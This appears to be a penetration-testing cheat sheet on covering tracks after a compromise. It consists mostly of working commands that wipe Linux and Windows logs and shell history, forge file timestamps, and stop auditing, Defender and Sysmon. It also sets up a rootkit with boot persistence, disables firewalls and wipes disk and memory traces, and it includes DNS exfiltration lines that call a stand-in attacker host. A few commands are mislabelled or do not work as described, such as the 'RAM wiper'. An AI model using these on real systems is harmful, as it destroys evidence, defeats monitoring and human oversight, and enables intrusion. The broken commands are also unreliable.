# Covering Tracks & Evasion

**Source:** OSCP & Penetration Testing Best Practices

## Quick Intro

- Remove evidence of exploitation
- Disable logging/audit trails
- Delete command history
- Manipulate file timestamps
- Clear application logs
- Disable antivirus/SIEM detection

## Log Deletion (Linux)

### Clear System Logs

```bash
# Remove all logs from /var/log
rm -rf /var/log/*

# Or clear individual logs
> /var/log/auth.log
> /var/log/syslog
> /var/log/messages
> /var/log/secure

# Truncate without deleting file
truncate -s 0 /var/log/auth.log

# Clear wtmp (login records)
> /var/log/wtmp
> /var/log/btmp

# Clear lastlog
> /var/log/lastlog

# Remove log rotation config
rm /etc/logrotate.d/*
```

### Find and Delete Logs

```bash
# Find log files
find /var/log -type f -name "*.log" -exec rm {} \;

# Find by timestamp (last 24 hours)
find /var/log -type f -mtime -1 -delete

# Remove system logs with pattern
find / -name "*auth*" -type f 2>/dev/null -delete
find / -name "*access*" -type f 2>/dev/null -delete
```

## Command History Clearing

### Bash History

```bash
# Clear current session history
history -c

# Clear history file
> ~/.bash_history
cat /dev/null > ~/.bash_history

# Delete history file
rm ~/.bash_history

# Prevent history logging
unset HISTFILE
export HISTFILE=/dev/null

# Disable history in session
set +o history

# Clear history across all shells
for user in $(cut -f1 -d: /etc/passwd); do
  > /home/$user/.bash_history
done
```

### Zsh/Fish History

```bash
# Zsh
> ~/.zsh_history
rm ~/.zsh_history

# Fish
> ~/.local/share/fish/fish_history

# Ksh
> ~/.sh_history
```

### Command History Manipulation

```bash
# Edit specific entries (dangerous, risky)
# Find sensitive commands
grep -n "password\|token\|key" ~/.bash_history

# Use sed to remove lines
sed -i '/password/d' ~/.bash_history

# Remove last 10 commands
history -d $(expr $(history 1 | awk '{print $1}') - 10)
```

## File Timestamp Manipulation

### Linux Timestamp Modification

```bash
# View timestamps
ls -la file.txt
stat file.txt

# Modify access/modification time (touch)
touch -t 202301011200 file.txt  # Set to Jan 1, 2023 12:00

# Copy timestamps from another file
touch -r reference_file.txt target_file.txt

# Set to specific time using date
touch -d "2023-01-01 12:00:00" file.txt

# Using stat to view nanoseconds
stat file.txt | grep -E "Access|Modify|Change"

# Modify with faketime (runtime manipulation)
faketime '2023-01-01 12:00:00' ./command
```

### Windows Timestamp Modification

```powershell
# View file timestamps
Get-Item file.txt | Select-Object CreationTime, LastWriteTime, LastAccessTime

# Modify timestamps
$file = Get-Item C:\path\to\file.txt
$file.CreationTime = "2023-01-01 12:00:00"
$file.LastWriteTime = "2023-01-01 12:00:00"
$file.LastAccessTime = "2023-01-01 12:00:00"

# Use .NET method
[System.IO.File]::SetCreationTime("C:\path\file.txt", "2023-01-01 12:00:00")
[System.IO.File]::SetLastWriteTime("C:\path\file.txt", "2023-01-01 12:00:00")
[System.IO.File]::SetLastAccessTime("C:\path\file.txt", "2023-01-01 12:00:00")
```

## Windows Event Log Deletion

### Clear Windows Logs via GUI

```powershell
# Open Event Viewer
eventvwr.msc

# Clear logs via PowerShell
Get-EventLog -LogName Application | Remove-EventLog
Get-EventLog -LogName Security | Remove-EventLog
Get-EventLog -LogName System | Remove-EventLog
```

### Clear via PowerShell

```powershell
# List logs
Get-EventLog -List

# Clear specific log
Clear-EventLog -LogName Application
Clear-EventLog -LogName Security
Clear-EventLog -LogName System

# Clear all logs
Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }

# Clear Windows Event Logs (newer systems)
wevtutil.exe cl Application
wevtutil.exe cl Security
wevtutil.exe cl System

# Disable Event Log Service
Stop-Service -Name "EventLog" -Force
```

### Delete Event Log Files

```powershell
# Event logs location
C:\Windows\System32\winevt\Logs\

# Delete log files (requires admin + system restart)
Remove-Item C:\Windows\System32\winevt\Logs\*.evtx -Force

# Disable event logging in registry
reg add "HKLM\SYSTEM\CurrentControlSet\Services\eventlog" /v AutoBackupLogFiles /t REG_DWORD /d 0 /f
```

## Application Log Clearing

### Web Server Logs

```bash
# Apache access/error logs
> /var/log/apache2/access.log
> /var/log/apache2/error.log

# Nginx logs
> /var/log/nginx/access.log
> /var/log/nginx/error.log

# IIS logs (Windows)
# C:\inetpub\logs\LogFiles\
Remove-Item C:\inetpub\logs\LogFiles\W3SVC* -Recurse -Force
```

### Database Logs

```bash
# MySQL
mysqld --skip-logging
mysql -u root -p -e "FLUSH LOGS;"

# PostgreSQL
rm /var/log/postgresql/postgresql.log

# MSSQL
EXEC sp_cycle_errorlog;
```

### Application-Specific Logs

```bash
# SSH logs
> /var/log/auth.log
> /var/log/secure

# Sudo logs
> /var/log/sudo

# Cron logs
> /var/log/cron
rm /var/spool/cron/crontabs/*

# SSH key audit
> ~/.ssh/authorized_keys
```

## Disabling Logging/Audit

### Linux Disable Logging

```bash
# Disable rsyslog
systemctl stop rsyslog
systemctl disable rsyslog

# Disable auditd
systemctl stop auditd
systemctl disable auditd

# Remove audit rules
auditctl -W /etc/passwd -p wa -k passwd_changes
auditctl -D  # Delete all rules

# Disable command auditing
export HISTFILE=/dev/null
```

### Windows Disable Auditing

```powershell
# Disable Windows Defender logging
Stop-Service -Name WinDefend -Force
Set-Service -Name WinDefend -StartupType Disabled

# Disable Sysmon
Stop-Service -Name Sysmon -Force
# Or remove it
Remove-Item C:\Windows\System32\sysmon.exe -Force

# Disable PowerShell logging
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

# Disable Windows logging via Group Policy
gpedit.msc
# Navigate: Computer Configuration > Administrative Templates > System > Audit Process Creation
# Set to "Disabled"
```

## Network Traffic Obfuscation

### Encrypted Tunnels

```bash
# SSH tunnel (hide traffic)
ssh -N -f -L 8080:127.0.0.1:80 user@target

# SSL/TLS wrapper
socat OPENSSL-LISTEN:443,cert=/tmp/cert.pem,fork TCP:127.0.0.1:4444

# VPN tunnel
openvpn --config client.conf
```

### DNS Tunneling

```bash
# Encode data in DNS queries
dnscat2 client attacker.com

# Covert DNS exfiltration
nslookup $(whoami | base64).attacker.com
```

### Steganography

```bash
# Hide data in image
steghide embed -cf image.jpg -ef secret.txt

# Detect steganography
steghide extract -sf image.jpg

# JPEG steganography
outguess -k "password" -d secret.txt image.jpg image_out.jpg
```

## Rootkit Deployment

### Linux Rootkit Installation

```bash
# Download rootkit source
git clone https://github.com/attacker/rootkit.git

# Compile
cd rootkit
make

# Insert into kernel
insmod rootkit.ko

# Verify hidden
lsmod | grep rootkit  # Should not appear

# Check with chkrootkit (if not removed)
chkrootkit
```

### Rootkit Persistence

```bash
# Add to initramfs
cat rootkit.ko >> /boot/initramfs-$(uname -r).img

# Modify GRUB
vim /etc/default/grub
# Add kernel module load: GRUB_CMDLINE_LINUX="init=/malicious/init.d"
update-grub

# Add to systemd
cat > /etc/systemd/system/persistence.service << 'EOF'
[Unit]
Description=System Maintenance

[Service]
ExecStart=/bin/insmod /malicious/rootkit.ko

[Install]
WantedBy=multi-user.target
EOF

systemctl enable persistence.service
```

## Artifact Cleanup

### Remove Exploitation Tools

```bash
# Delete tool directory
rm -rf /tmp/tools/
rm -rf /opt/exploits/

# Secure delete (overwrite before removal)
shred -vfz -n 10 /path/to/tool
srm -r /path/to/tool  # Secure remove
```

### Clear SSH Evidence

```bash
# Remove new SSH keys
rm ~/.ssh/id_rsa*
rm ~/.ssh/authorized_keys

# Clear SSH config
> ~/.ssh/config

# Remove SSH agent
ssh-agent -k

# Clear SSH credentials
unset SSH_AGENT_PID
unset SSH_AUTH_SOCK
```

### Clean Temporary Files

```bash
# Remove temp files
rm -rf /tmp/*
rm -rf /var/tmp/*
rm -rf /dev/shm/*

# Clear cache
> ~/.cache
> ~/.local/share/recently-used

# Remove cron artifacts
crontab -r
rm /var/spool/cron/crontabs/*
```

## Firewall/IDS Evasion

### Firewall Rule Manipulation

```bash
# List iptables rules
iptables -L -n

# Add rule to drop detection traffic
iptables -A INPUT -p tcp --dport 5985 -j DROP

# Save iptables
iptables-save > /etc/iptables/rules.v4

# Linux firewalld
firewall-cmd --permanent --add-service=http
firewall-cmd --reload
```

### Windows Firewall

```powershell
# Disable Windows Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Add bypass rule
netsh advfirewall firewall add rule name="Bypass" dir=in action=allow protocol=any remoteip=attacker.com

# List firewall rules
Get-NetFirewallRule | Select-Object DisplayName, Direction, Action
```

## Anti-Forensics Techniques

### Disable Swap/Hibernation

```bash
# Disable swap
swapoff -a
rm /swapfile

# Disable hibernation (Windows)
powercfg /h off

# Clear swap
dd if=/dev/zero of=/var/cache/swap bs=1M
```

### Overwrite Free Space

```bash
# Linux: Fill free space then delete
dd if=/dev/zero of=/tmp/fillspace
rm /tmp/fillspace

# Using secure-delete
sfill -vfz /

# Windows: Cipher
cipher /w:C:\  # Overwrite free space on C: drive
```

### Memory Wipe

```bash
# Linux: Clear memory
sync; echo 3 > /proc/sys/vm/drop_caches

# Windows: RAM wiper
psexec.exe -s "powershell -Command '$ram = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1GB); [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ram)'"
```

## Detection & Testing Checklist

- [x] Clear system logs (/var/log)
- [x] Clear wtmp/btmp/lastlog
- [x] Clear bash history and HISTFILE
- [x] Manipulate file timestamps (touch, faketime)
- [x] Clear Windows Event Logs
- [x] Disable rsyslog/auditd
- [x] Disable Windows Defender logging
- [x] Disable Sysmon
- [x] Remove SSH keys and credentials
- [x] Remove exploitation tools/artifacts
- [x] Clear temp directories (/tmp, /var/tmp)
- [x] Clear cron jobs
- [x] Secure delete files (shred, srm)
- [x] Disable swap/hibernation
- [x] Overwrite free space
- [x] Wipe memory
- [x] Deploy rootkit
- [x] Configure firewall bypass rules
- [x] Disable Windows Firewall
- [x] Verify no log evidence remains

## Related Notes

- [[05-Persistence]] → Maintain persistence before covering tracks
- [[06-Exploitation]] → Clean up after exploitation
- [[04-Privilege-Escalation]] → Remove privilege escalation artifacts
